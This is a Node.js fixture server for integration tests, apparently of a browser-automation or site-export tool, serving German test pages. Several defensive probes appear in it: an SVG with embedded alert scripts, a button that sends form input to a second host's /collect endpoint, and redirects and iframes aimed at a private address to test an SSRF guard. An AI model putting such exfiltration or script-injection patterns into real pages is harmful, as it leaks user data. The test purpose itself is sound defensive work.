// Fixture pages for the integration tests, served by host name: `fixtures.test` (the site under test) and
// `other.test` (a second site). Requests that must never arrive (a private address after a redirect, a submission
// that was not released) are recorded in `hits`, so a test can prove they did not happen.
import http from 'node:http';

const html = body => `<!doctype html><html lang="de"><head><meta charset="utf-8"><title>${body.title}</title>${body.head ?? ''}</head><body>${body.body}</body></html>`;

const DESIGN_CSS = `
@font-face { font-family: "Fixture Sans"; src: url("/fonts/fixture-sans.woff2") format("woff2"); font-weight: 400; font-style: normal; }
:root { --brand-logo: #1fa35a; --brand-primary: #0a7d5c; --brand-accent: #e4572e; --text: #1a1a2e; --surface: #f2f4f3; --radius: 8px; --unused-token: 3px; }
body { margin: 0; background: #ffffff; color: var(--text); font-family: "Fixture Sans", Helvetica, Arial, sans-serif; font-size: 16px; line-height: 1.5; }
header { position: relative; display: flex; align-items: center; justify-content: space-between; padding: 16px 32px; background: #ffffff; border-bottom: 1px solid #d9dedc; }
.behind { position: absolute; left: 20px; top: 6px; width: 220px; height: 64px; background: #4a4a20; }
.brand { position: relative; display: inline-block; background: var(--brand-logo); color: #ffffff; border-radius: 999px; padding: 8px 16px; line-height: 0; }
.logo-word { fill: currentColor; }
.logo-hidden { opacity: 0; }
nav a { color: var(--text); font-weight: 600; text-decoration: none; margin-left: 24px; font-size: 15px; }
nav a:hover { color: var(--brand-primary); }
h1 { font-size: 48px; font-weight: 700; line-height: 56px; letter-spacing: -0.5px; margin: 32px; }
h2 { font-size: 32px; font-weight: 700; margin: 24px 32px; }
h3 { font-size: 22px; font-weight: 600; margin: 0 0 8px; }
p { margin: 0 32px 16px; max-width: 720px; }
.hero { background: var(--brand-primary); color: #ffffff; padding: 64px 32px; }
.hero h1 { margin: 0 0 16px; }
.hero p { margin: 0; }
.btn-primary { display: inline-block; background: var(--brand-primary); color: #ffffff; border: 0; border-radius: var(--radius); padding: 12px 24px; font-size: 16px; font-weight: 700; text-decoration: none; }
.btn-primary:hover { background: #075e45; }
.btn-secondary { display: inline-block; background: transparent; color: var(--brand-primary); border: 2px solid var(--brand-primary); border-radius: var(--radius); padding: 10px 22px; font-size: 16px; font-weight: 700; text-decoration: none; }
.actions { display: flex; gap: 16px; margin: 24px 32px; }
.cards { display: grid; grid-template-columns: repeat(3, 1fr); gap: 24px; margin: 24px 32px; }
.card { background: var(--surface); border-radius: 16px; box-shadow: 0 2px 8px rgba(0, 0, 0, 0.12); padding: 24px; }
.accent { color: var(--brand-accent); }
`;

// a light drawing in currentColor on a pill that comes from the wrapper's CSS (background, border-radius), with a dark
// element of the page behind it (a sibling, as a hero image behind a header): the export must show the pill and the
// drawing, never the page around it
const LOGO_SVG = '<svg width="140" height="32" viewBox="0 0 140 32" aria-label="Fixture Logo" class="site-logo"><script>alert(1)</script><path fill="currentColor" onclick="alert(2)" d="M0 0h32v32H0z"/><path class="logo-word" d="M40 8h100v16H40z"/><path class="logo-hidden" fill="#ff0000" d="M0 0h4v4H0z"/></svg>';

/**
 * @param {{port: number, privateHost: string}} context privateHost: an address the guard must refuse that still reaches this server
 */
const pages = ({ port, privateHost }) => ({
  'fixtures.test': {
    '/': () => html({
      title: 'Fixture Start',
      body: `<header><a href="/">Start</a><nav aria-label="Haupt"><a href="/design">Design</a><a href="/form">Formular</a><a href="/impressum">Impressum</a></nav></header>
        <main><h1>Willkommen</h1><p>Eine Startseite für Tests.</p><a href="/popup-target" target="_blank">Neues Fenster</a></main>`,
    }),
    '/impressum': () => html({ title: 'Impressum', body: '<main><h1>Impressum</h1><p>Fixture GmbH, Teststraße 1, 12345 Teststadt</p></main>' }),
    '/popup-target': () => html({ title: 'Popup', body: '<main><h1>Popup-Seite</h1></main>' }),
    '/design': () => html({
      title: 'Fixture Design',
      head: '<link rel="stylesheet" href="/design.css"><link rel="icon" href="/favicon.png"><meta property="og:image" content="/og.png"><script type="application/ld+json">{"@context":"https://schema.org","@type":"Organization","name":"Fixture","logo":"https://fixtures.test/logo.png"}</script>',
      body: `<header><div class="behind"></div><a href="/" class="logo-link brand">${LOGO_SVG}</a><nav aria-label="Haupt"><a href="/a">Leistungen</a><a href="/b">Über uns</a><a href="/c">Kontakt</a></nav></header>
        <main><section class="hero"><h1>Gesund unterwegs</h1><p>Text auf der Markenfarbe.</p></section>
        <div class="actions"><a class="btn-primary" href="/start">Jetzt starten</a><a class="btn-secondary" href="/more">Mehr erfahren</a><button class="btn-primary">Mitmachen</button></div>
        <h2>Unsere Angebote</h2>
        <div class="cards">${[1, 2, 3].map(index => `<div class="card"><h3>Angebot ${index}</h3><p style="margin:0">Beschreibung des Angebots ${index} mit genug Text für eine Karte.</p></div>`).join('')}</div>
        <p>Fließtext in der Textfarbe, lang genug, um als Body-Text erkannt zu werden. <span class="accent">Akzent</span></p></main>`,
    }),
    '/design.css': () => ({ type: 'text/css', body: DESIGN_CSS }),
    '/fonts/fixture-sans.woff2': () => ({ type: 'font/woff2', body: Buffer.from('wOF2-not-a-real-font') }),
    '/form': () => html({
      title: 'Formular',
      body: `<main><h1>Kontakt</h1>
        <label>Nachricht <input name="message" id="message"></label>
        <button id="send" type="button" onclick="fetch('/api/send', {method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({message: document.getElementById('message').value, channel: 'web'})}).then(r => r.text()).then(t => { document.getElementById('status').textContent = 'gesendet: ' + t; })">Senden</button>
        <p id="status">offen</p>
        <form method="post" action="/api/form"><label>Betreff <input name="subject"></label><input type="hidden" name="csrf" value="abc123"><button type="submit">Formular abschicken</button></form>
        <form method="get" action="/search"><label>Suche <input name="q"></label><button type="submit">Suchen</button></form>
        <label>Passwort <input type="password" name="pw"></label>
        <label>Kartennummer <input name="cardnumber" autocomplete="cc-number"></label>
        <select aria-label="Thema" name="topic"><option value="a">Allgemein</option><option value="b">Beitrag</option></select>
        <button id="leak" type="button" onclick="fetch('http://other.test:${port}/collect?d=' + encodeURIComponent(document.getElementById('message').value), {mode: 'no-cors'})">Teilen</button>
        </main>`,
    }),
    '/search': query => html({ title: 'Suche', body: `<main><h1>Suche</h1><p>Ergebnisse für ${String(query.get('q') ?? '').replace(/[<>&]/g, '')}</p></main>` }),
    '/api/send': () => ({ type: 'text/plain', body: 'ok' }),
    '/api/form': () => html({ title: 'Danke', body: '<main><h1>Danke</h1></main>' }),
    '/redirect-private': () => ({ status: 302, location: `http://${privateHost}:${port}/private-hit` }),
    '/redirect-loop': () => ({ status: 302, location: '/redirect-loop2' }),
    '/redirect-loop2': () => ({ status: 302, location: '/redirect-loop' }),
    '/subframe': () => html({
      title: 'Subframe',
      body: `<main><h1>Mit Rahmen</h1><iframe src="http://other.test:${port}/frame" width="400" height="200"></iframe>
        <iframe src="http://${privateHost}:${port}/private-hit-iframe" width="100" height="100"></iframe></main>`,
    }),
    '/big': () => html({
      title: 'Viele Links',
      body: `<header><nav aria-label="Viele">${Array.from({ length: 1500 }, (_, index) => `<a href="/item/${index}">Eintrag Nummer ${index} mit einem längeren Namen</a>`).join(' ')}</nav></header>
        <main><h1>Große Seite</h1>${Array.from({ length: 300 }, (_, index) => `<p>Absatz ${index}: ${'Lorem ipsum dolor sit amet, '.repeat(6)}</p>`).join('')}</main>`,
    }),
  },
  'other.test': {
    '/frame': () => html({ title: 'Frame', body: '<p>Fremder Rahmen</p><img src="/hop" width="10" height="10"><script>fetch("/hop-fetch").catch(() => {})</script>' }),
    '/hop': () => ({ status: 302, location: `http://${privateHost}:${port}/private-hit-frame-image` }),
    '/hop-fetch': () => ({ status: 302, location: `http://${privateHost}:${port}/private-hit-frame-fetch` }),
    '/collect': () => ({ type: 'text/plain', body: 'collected' }),
  },
});

/**
 * @param {{port?: number, privateHost: string}} options
 * @returns {Promise<{server: http.Server, port: number, hits: {host: string, method: string, path: string, body: string}[], setPrivateHost: (host: string) => void}>}
 */
export const startFixtureServer = async ({ port = 0, privateHost = '127.0.0.1' } = {}) => {
  const hits = [];
  const state = { privateHost };
  const server = http.createServer((request, response) => {
    const chunks = [];
    request.on('data', chunk => chunks.push(chunk));
    request.on('end', () => {
      const url = new URL(request.url ?? '/', 'http://fixture');
      const host = (request.headers.host ?? '').split(':')[0];
      hits.push({ host, method: request.method, path: url.pathname, query: url.search, body: Buffer.concat(chunks).toString('utf8') });
      const route = pages({ port: server.address().port, privateHost: state.privateHost })[host]?.[url.pathname];
      if (!route) {
        response.writeHead(url.pathname.startsWith('/private-hit') ? 200 : 404, { 'Content-Type': 'text/plain' });
        response.end(url.pathname.startsWith('/private-hit') ? 'reached' : 'not found');
        return;
      }
      const answer = route(url.searchParams);
      if (typeof answer === 'string') {
        response.writeHead(200, { 'Content-Type': 'text/html; charset=utf-8' });
        response.end(answer);
        return;
      }
      if (answer.status === 302) {
        response.writeHead(302, { Location: answer.location });
        response.end();
        return;
      }
      response.writeHead(200, { 'Content-Type': answer.type });
      response.end(answer.body);
    });
  });
  await new Promise(resolve => server.listen(port, '0.0.0.0', resolve));
  return { server, port: server.address().port, hits, setPrivateHost: host => { state.privateHost = host; } };
};
